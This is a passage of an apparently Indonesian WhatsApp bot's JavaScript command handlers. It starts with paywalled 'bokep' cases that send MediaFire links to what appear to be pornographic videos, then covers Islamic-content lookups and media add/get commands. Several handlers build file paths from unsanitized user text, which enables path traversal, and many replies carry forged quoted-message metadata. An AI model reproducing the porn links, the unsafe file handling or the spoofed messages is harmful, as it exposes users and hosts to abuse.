				   case 'bokep11':	
            if (!isPremium) return sendButMessage(from, harusvip, goprem, torem, {quoted:dim})

				qute = fs.readFileSync('media/Menu.jpg') 
				   dimas.sendMessage(from, qute, image, { quoted: dim, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/60dqek0mqhyt6rn/VID-20210107-WA1530.mp4/file' })				   
				   break
				   case 'bokep12':	
			                if (!isPremium) return sendButMessage(from, harusvip, goprem, torem, {quoted:dim})

				qute = fs.readFileSync('media/Menu.jpg') 
				   dimas.sendMessage(from, qute, image, { quoted: dim, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/ni2mcdknb6zn50t/VID-20210107-WA1532.mp4/file' })				   
				   break
				   case 'bokep13':	
            if (!isPremium) return sendButMessage(from, harusvip, goprem, torem, {quoted:dim})

				qute = fs.readFileSync('media/Menu.jpg') 
				   dimas.sendMessage(from, qute, image, { quoted: dim, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/i9t96lrmd9lm71z/VID-20210107-WA1542.mp4/file' })				   
				   break
				   case 'bokep14':	
            if (!isPremium) return sendButMessage(from, harusvip, goprem, torem, {quoted:dim})

				qute = fs.readFileSync('media/Menu.jpg') 
				   dimas.sendMessage(from, qute, image, { quoted: dim, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/tjqdfmp8g08dt4e/VID-20210107-WA1536.mp4/file' })				   
				   break
	               case 'bokep15':
            if (!isPremium) return sendButMessage(from, harusvip, goprem, torem, {quoted:dim})

				qute = fs.readFileSync('media/Menu.jpg') 
				   dimas.sendMessage(from, qute, image, { quoted: dim, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/x034q0s16u9vyhy/VID-20210107-WA1537.mp4/file' })				   
				   break
    	           case 'bokep16':
            if (!isPremium) return sendButMessage(from, harusvip, goprem, torem, {quoted:dim})

				qute = fs.readFileSync('media/Menu.jpg') 
				   dimas.sendMessage(from, qute, image, { quoted: dim, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/mgmynqghjnon2q7/VID-20210107-WA1533.mp4/file' })				   
				   break
				   case 'bokep17':	
            if (!isPremium) return sendButMessage(from, harusvip, goprem, torem, {quoted:dim})

				qute = fs.readFileSync('media/Menu.jpg') 
				   dimas.sendMessage(from, qute, image, { quoted: dim, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/ecly00at6adxs20/VID-20210107-WA1540.mp4/file' })				   
				   break
				   case 'bokep18':
            if (!isPremium) return sendButMessage(from, harusvip, goprem, torem, {quoted:dim})

				qute = fs.readFileSync('media/Menu.jpg') 
				   dimas.sendMessage(from, qute, image, { quoted: dim, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/7qkn8nuog22jsco/VID-20210107-WA1534.mp4/file' })				   
				   break
				   case 'bokep19':				 
				            if (!isPremium) return sendButMessage(from, harusvip, goprem, torem, {quoted:dim})

				qute = fs.readFileSync('media/Menu.jpg') 
				   dimas.sendMessage(from, qute, image, { quoted: dim, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/vza5uaben93dfdr/VID-20210107-WA1527.mp4/file' })				   
				   break
				   case 'bokep20':			
            if (!isPremium) return sendButMessage(from, harusvip, goprem, torem, {quoted:dim})

				qute = fs.readFileSync('media/Menu.jpg') 
				   dimas.sendMessage(from, qute, image, { quoted: dim, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/l7uzd4v9p95wpeb/VID-20210107-WA1541.mp4/file' })				   
				   break
				   case 'bokep21':				 
				            if (!isPremium) return sendButMessage(from, harusvip, goprem, torem, {quoted:dim})

				qute = fs.readFileSync('media/Menu.jpg') 
				   dimas.sendMessage(from, qute, image, { quoted: dim, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/icpnxsr18j6l2pp/VID-20210107-WA1528.mp4/file' })				   
				   break
				   case 'bokep22':		
            if (!isPremium) return sendButMessage(from, harusvip, goprem, torem, {quoted:dim})

				qute = fs.readFileSync('media/Menu.jpg') 
				   dimas.sendMessage(from, qute, image, { quoted: dim, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/cscj9taoq5s5oj9/VID-20210107-WA1538.mp4/file' })				   
				   break
				   case 'bokep23':	
            if (!isPremium) return sendButMessage(from, harusvip, goprem, torem, {quoted:dim})

				qute = fs.readFileSync('media/Menu.jpg') 
				   dimas.sendMessage(from, qute, image, { quoted: dim, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/saer161lthn4sy3/VID-20210107-WA1525.mp4/file' })				   
				   break
				   case 'bokep24':				 
				            if (!isPremium) return sendButMessage(from, harusvip, goprem, torem, {quoted:dim})

				qute = fs.readFileSync('media/Menu.jpg') 
				   dimas.sendMessage(from, qute, image, { quoted: dim, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \\nhttps://www.mediafire.com/file/9jy3nj2b2ljjzxb/VID-20210107-WA1539.mp4/file' })				   
				   break
				   case 'bokep25':		
		 

   case 'islammenu':
        case  'islamimenu':
              groups = dimas.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = dimas.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
              charger = `${charging ? 'lagi dicas' : 'ga dicas'}`
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await dimas.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
              
      
 menu =` ${botName}


Hai kak 👋🏻 ${pushname}
Jangan lupa bersyukur untuk hari ini ~
Silahkan pilih tabel di bawah ini , jika tidak support silahkan ketik ! command 

▢ 𝐆𝐫𝐨𝐮𝐩 𝐂𝐡𝐚𝐭𝐬 : *${groups.length}*
▢ 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 𝐂𝐡𝐚𝐭𝐬 : *${privat.length}*
▢ 𝐓𝐨𝐭𝐚𝐥 𝐂𝐡𝐚𝐭𝐬 : *${totalChat.length}*
▢ 𝐒𝐩𝐞𝐞𝐝 : *${latensie.toFixed(4)} _Second_*
▢ 𝐀𝐜𝐭𝐢𝐯𝐞 : *${runtime(process.uptime())}*
▢ 𝐏𝐥𝐚𝐭𝐟𝐨𝐫𝐦 : *${os.platform()}*

         

┏⬡ 𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔
┃▹  ${prefix}listsurah
┃▹  ${prefix}alquran
┃▹  ${prefix}alquranaudio
┃▹  ${prefix}asmaulhusna
┃▹  ${prefix}kisahnabi
┃▹  ${prefix}jadwalsholat
┗⬡
`
               buttons =  [
    {buttonId: `${prefix}rules`, buttonText: {displayText: 'S&K'}, type: 1},
]
               imageMsg = (await dimas.prepareMessageMedia(fs.readFileSync(`./media/Menu.jpg`), 'imageMessage', { thumbnail:Bfake, contextInfo:{forwardingScore: 989, isForwarded: true }})).imageMessage

               buttonsMessage = {
               contentText: `${menu}`,
               footerText:  `   
  ${ucapanWaktu}
              

 ♥️ SULAWESI SELATAN\n\n♥️ Dimas Edr`, imageMessage: imageMsg,
               buttons: buttons,
               headerType: 4
}


               prep = await dimas.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply, contextInfo:{ forwardingScore:508, isForwarded:true, mentionedJid:[senderr]}})
              dimas.relayWAMessage(prep)
               break
   case 'command':
               list = []
               listmenu = [`groupmenu`,`photoxy`,`ephoto`,`randomimage`,`wibu2`,`storymenu`,`randomtext`,`islammenu`,`wibumenu`,`stickermenu`,`ownermenu`,`gamemenu`,`funmenu`,`downloadmenu`,`infomenu`,`othermenu`,`owner`,`ikyygroup`,`sewabot`,'imageefek']
               listmenuu = [`Menu Group`,`Photo Oky`,`Ephoto Menu`,`Random Image`,`Wibu Menu`,`Movie&Story`,`RandomText`,`Islam Menu`,`Wibu Menu`,`Sticker Menu`,`Owner Command`,`Game Menu`,`For Fun Menu`,`Downloader`,`Info Menu`,`Menu Lainnya`,`OwnerBot`,`Official Group`,`Rent this Bot`,'Image Efek']
               nombor = 1
               startnum = 0
               for (let x of listmenu) {
               const yy = {title: 'Sub-Menu Ke-' + nombor++,
                    rows: [
                       {
                        title: `${listmenuu[startnum++]}`,
                        description: ``,
                        rowId: `${prefix}${x}`
                      }
                    ]
                   }
                        list.push(yy)
           }
               listmsg(from, `@ M I Z U K I  B O T\n\nSilahkan pilih sub menu di bawah.`,`  `, list)
               break
   
   ///ISLAMI MENU  
   case 'addrespon':
                         if (!isOwner) return reply(mess.only.owner)
                if (args.length > 1) return reply(`Penggunaan ${prefix}addrespon hai|hai juga`)
                argz = arg.split('|')
                if (checkCommands(argz[0], commandsDB) === true) return reply(`Udah ada`)
                addCommands(argz[0], argz[1], sender, commandsDB)
                reply(`Sukses menambahkan respon ${argz[0]}`)
                break
            case 'delrespon':
                         if (!isOwner) return reply(mess.only.owner)
                if (args.length < 1) return reply(`Penggunaan ${prefix}delrespon hai`)
                if (!checkCommands(body.slice(11), commandsDB)) return reply(`Ga ada di database`)
                deleteCommands(body.slice(11), commandsDB)
                reply(`Sukses menghapus respon ${body.slice(11)}`)
                break

// Islami //
                case 'listsurah':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/quran?apikey=${setting.lolkey}`)
                    get_result = get_result.result
                    ini_txt = 'List Surah:\n'
                    for (var x in get_result) {
                        ini_txt += `${x}. ${get_result[x]}\n`
                    }
                    reply(ini_txt)
                    break
                case 'alquran':
                    if (args.length < 1) return reply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10 or ${prefix + command} 18/1-10`)
                    urls = `https://api.lolhuman.xyz/api/quran/${args[0]}?apikey=${setting.lolkey}`
                    quran = await fetchJson(urls)
                    result = quran.result
                    ayat = result.ayat
                    ini_txt = `QS. ${result.surah} : 1-${ayat.length}\n\n`
                    for (var x of ayat) {
                        arab = x.arab
                        nomor = x.ayat
                        latin = x.latin
                        indo = x.indonesia
                        ini_txt += `${arab}\n${nomor}. ${latin}\n${indo}\n\n`
                    }
                    ini_txt = ini_txt.replace(/<u>/g, "").replace(/<\/u>/g, "")
                    ini_txt = ini_txt.replace(/<strong>/g, "").replace(/<\/strong>/g, "")
                    ini_txt = ini_txt.replace(/<u>/g, "").replace(/<\/u>/g, "")
                    reply(ini_txt)
                    break
                case 'alquranaudio':
                    if (args.length == 0) return reply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10`)
                    surah = args[0]
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/quran/audio/${surah}?apikey=${setting.lolkey}`)
                    await dimas.sendMessage(from, ini_buffer, audio, { quoted: freply, mimetype: Mimetype.mp4Audio })
                    break
                case 'asmaulhusna':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/asmaulhusna?apikey=${setting.lolkey}`)
                    get_result = get_result.result
                    ini_txt = `No : ${get_result.index}\n`
                    ini_txt += `Latin: ${get_result.latin}\n`
                    ini_txt += `Arab : ${get_result.ar}\n`
                    ini_txt += `Indonesia : ${get_result.id}\n`
                    ini_txt += `English : ${get_result.en}`
                    reply(ini_txt)
                    break
                case 'kisahnabi':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Muhammad`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/kisahnabi/${query}?apikey=${setting.lolkey}`)
                    get_result = get_result.result
                    ini_txt = `Name : ${get_result.name}\n`
                    ini_txt += `Lahir : ${get_result.thn_kelahiran}\n`
                    ini_txt += `Umur : ${get_result.age}\n`
                    ini_txt += `Tempat : ${get_result.place}\n`
                    ini_txt += `Story : \n${get_result.story}`
                    reply(ini_txt)
                    break
                case 'jadwalsholat':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Yogyakarta`)
                    daerah = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/sholat/${daerah}?apikey=${setting.lolkey}`)
                    get_result = get_result.result
                    ini_txt = `Wilayah : ${get_result.wilayah}\n`
                    ini_txt += `Tanggal : ${get_result.tanggal}\n`
                    ini_txt += `Sahur : ${get_result.sahur}\n`
                    ini_txt += `Imsak : ${get_result.imsak}\n`
                    ini_txt += `Subuh : ${get_result.subuh}\n`
                    ini_txt += `Terbit : ${get_result.terbit}\n`
                    ini_txt += `Dhuha : ${get_result.dhuha}\n`
                    ini_txt += `Dzuhur : ${get_result.dzuhur}\n`
                    ini_txt += `Ashar : ${get_result.ashar}\n`
                    ini_txt += `Maghrib : ${get_result.imsak}\n`
                    ini_txt += `Isya : ${get_result.isya}`
                    reply(ini_txt)
                    break
      case 'rules':
             dimas.sendMessage(from, rulesBot(prefix), MessageType.text, {quoted: freply})
             break

      
      
     
                    ////SPORTAGE MENU
               
               case 'slow':
					encmedia = JSON.parse(JSON.stringify(dim).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await dimas.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=0.7,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						dimas.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: freply})
						fs.unlinkSync(ran)
					})
					break
				case 'stickerlist':
			case 'liststicker':
				teks = '*Sticker List :*\n\n'
				for (let awokwkwk of setiker) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${setiker.length}*`
				dimas.sendMessage(from, teks.trim(), extendedText, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_「 の ＭｅＩｋｙ あ」_", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('media/Menu.jpg')} } }, contextInfo: { "mentionedJid": setiker } })
				dimas.sendMessage(from, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_「 の ＭｅＩｋｙ あ」_", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('media/Menu.jpg')}}}})

break
			case 'addsticker':
				
				svst = body.slice(12)
				if (!svst) return reply('Nama sticker nya apa?')
				boij = JSON.parse(JSON.stringify(dim).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await dimas.downloadMediaMessage(boij)
				setiker.push(`${svst}`)
				fs.writeFileSync(`./media/sticker/${svst}.webp`, delb)
				fs.writeFileSync('./media/stick.json', JSON.stringify(setiker))
				dimas.sendMessage(from, `Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststicker`, MessageType.text, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_「 の ＭｅＩｋｙ あ」_", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('media/Menu.jpg')} } } })
				dimas.sendMessage(from, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_「 の ＭｅＩｋｙ あ」_", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('media/Menu.jpg')}}}})

break
				
				
			case 'addvn':
				

				svst = body.slice(7)
				if (!svst) return reply('Nama audionya apa su?')
				boij = JSON.parse(JSON.stringify(dim).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await dimas.downloadMediaMessage(boij)
				audionye.push(`${svst}`)
				fs.writeFileSync(`./src/audio/${svst}.mp3`, delb)
				fs.writeFileSync('./src/audio.json', JSON.stringify(audionye))
				dimas.sendMessage(from, `Sukses Menambahkan Vn ke dalam database\nSilahkann Cek dengan cara ${prefix}listvn`, MessageType.text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_SelfBot MeIkyAds", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JStw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('media/Menu.jpg')} }} }) 
				break
			case 'getvn':
			   if (args.length < 1) return reply('Masukan nama yang terdaftar di list vn')
				namastc = body.slice(7)
				buffer = fs.readFileSync(`./src/audio/${namastc}.mp3`)
				dimas.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4',  quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_SelfBot MeIkyAds", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JStw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('media/Menu.jpg')} }}, ptt: true })
				break
			case 'getsticker':
			case 'gets':
			   if (args.length < 1) return reply('Masukan nama yang terdaftar di list sticker')
				namastc = body.slice(12)
				result = fs.readFileSync(`./src/sticker/${namastc}.webp`)
				dimas.sendMessage(from, result, sticker)
				break
           case 'liststicker':
				teks = '*Sticker List :*\n\n'
				for (let awokwkwk of setiker) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${setiker.length}*`
				dimas.sendMessage(from, teks.trim(), extendedText, {  quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_SelfBot MeIkyAds", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JStw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('media/Menu.jpg')} }}, contextInfo: { "mentionedJid": setiker } })
				break
			case 'listvn':
			case 'vnlist':
				teks = '*List Vn:*\n\n'
				for (let awokwkwk of audionye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${audionye.length}*`
				dimas.sendMessage(from, teks.trim(), extendedText, {  quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_SelfBot MeIkyAds", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JStw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('media/Menu.jpg')} }}, contextInfo: { "mentionedJid": audionye } })
				break
			case 'addimage':
				if (!isQuotedImage) return reply('Reply imagenya blokk!')
				svst = body.slice(10)
				if (!svst) return reply('Nama imagenya apa su?')
				boij = JSON.parse(JSON.stringify(dim).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await dimas.downloadMediaMessage(boij)
				imagenye.push(`${svst}`)
				fs.writeFileSync(`./src/image/${svst}.jpeg`, delb)
				fs.writeFileSync('./src/image.json', JSON.stringify(imagenye))
				dimas.sendMessage(from, `Sukses Menambahkan image ke dalam database\nSilahkan cek dengan cara ${prefix}listimage`, MessageType.text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_SelfBot MeIkyAds", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JStw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('media/Menu.jpg')} }} }) 
				
				break
			case 'getimage':
            case 'getimg':
			   if (args.length < 1) return reply('Masukan nama yang terdaftar di list image')
				namastc = body.slice(10)
				buffer = fs.readFileSync(`./src/image/${namastc}.jpeg`)
				dimas.sendMessage(from, buffer, image, {  quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_SelfBot MeIkyAds", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JStw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('media/Menu.jpg')} }}, caption: `Result From Database : ${namastc}.jpeg` })
				break
			case 'imagelist':
			case 'listimage':
				teks = '*List Image :*\n\n'
				for (let awokwkwk of imagenye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${imagenye.length}*`
				dimas.sendMessage(from, teks.trim(), extendedText, {  quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_SelfBot MeIkyAds", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JStw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('media/Menu.jpg')} }}, contextInfo: { "mentionedJid": imagenye } })
				break
				
			case 'addvideo':
				if (!isQuotedVideo) return reply('Reply videonya blokk!')
				svst = body.slice(10)
				if (!svst) return reply('Nama videonya apa su?')
				boij = JSON.parse(JSON.stringify(dim).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await dimas.downloadMediaMessage(boij)
				videonye.push(`${svst}`)
				fs.writeFileSync(`./src/video/${svst}.mp4`, delb)
				fs.writeFileSync('./src/video.json', JSON.stringify(videonye))
				dimas.sendMessage(from, `Sukses Menambahkan Video\nCek dengan cara ${prefix}listvideo`, MessageType.text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_SelfBot MeIkyAds", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JStw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('media/Menu.jpg')} }} }) 
				break
			case 'getvideo':
			   if (args.length < 1) return reply('Masukan nama yang terdaftar di list video')
				namastc = body.slice(10)
				buffer = fs.readFileSync(`./src/video/${namastc}.mp4`)
